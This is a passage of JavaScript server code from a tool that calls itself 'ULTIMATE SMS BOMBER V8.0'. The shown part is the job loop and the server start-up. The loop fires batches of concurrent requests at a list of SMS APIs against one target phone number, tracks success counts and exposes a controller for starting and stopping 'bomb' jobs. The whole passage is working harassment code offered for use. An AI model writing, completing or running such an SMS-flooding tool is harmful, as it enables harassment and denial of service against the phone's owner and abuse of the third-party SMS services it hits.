      console.log(`⏹️ Job ${jobId} stopped at ${processed}/${shuffled.length}`);
      break;
    }
    const batch = shuffled.slice(i, i + BATCH_SIZE);
    const batchPromises = batch.map(async (api) => {
      const promises = [];
      for (let j = 0; j < actualCount; j++) {
        if (!controller.isJobActive(jobId)) break;
        promises.push(callSingleAPI(api, phone, jobId));
      }
      const responses = await Promise.all(promises);
      responses.forEach(r => {
        if (!r.stopped) controller.updateJobStats(jobId, r.success, r.error);
      });
      return { api_id: api.id, success: responses.filter(r => r.success).length, failed: responses.filter(r => !r.success).length };
    });
    await Promise.all(batchPromises);
    processed += batch.length;
    if (processed % 10 === 0) console.log(`📊 Job ${jobId}: ${processed}/${shuffled.length}`);
    await Utility.sleep(30);
  }
  return { processed };
}

// ============================================================
// START SERVER
// ============================================================
const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
  console.log(`\n🚀 ULTIMATE SMS BOMBER V8.0`);
  console.log(`📡 PID: ${process.pid}`);
  console.log(`🌐 Port: ${CONFIG.server.port}`);
  console.log(`📊 Total APIs: ${SMS_APIS.length}`);
  console.log(`🔑 Keys loaded: ${keyManager.getAllKeys().length}`);
  console.log(`\n✅ Server ready!\n`);
});
server.timeout = 120000;
server.keepAliveTimeout = 60000;

process.on('SIGTERM', () => {
  bombController.stopAllJobs();
  server.close(() => process.exit(0));
});
process.on('SIGINT', () => {
  bombController.stopAllJobs();
  server.close(() => process.exit(0));
});

module.exports = { app, bombController, keyManager, apiStatsTracker, SMS_APIS };
